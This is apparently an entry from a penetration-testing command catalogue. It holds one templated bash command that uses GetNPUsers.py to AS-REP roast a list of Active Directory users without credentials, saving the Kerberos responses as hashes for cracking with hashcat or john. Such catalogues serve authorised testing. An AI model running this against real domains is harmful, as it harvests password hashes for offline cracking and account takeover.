---
id: 5400cee6-bf6e-4a93-a7ec-0369acb7479e
name: check ASREPRoast for a list of users (no credentials required)
type: command
executor: bash
data: 'python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format
  [hashcat | john]> -outputfile <output_AS_REP_responses_file>

  '
output: null
created_at: '2020-07-14T18:14:44.766288+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# check ASREPRoast for a list of users (no credentials required)

```bash
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

```


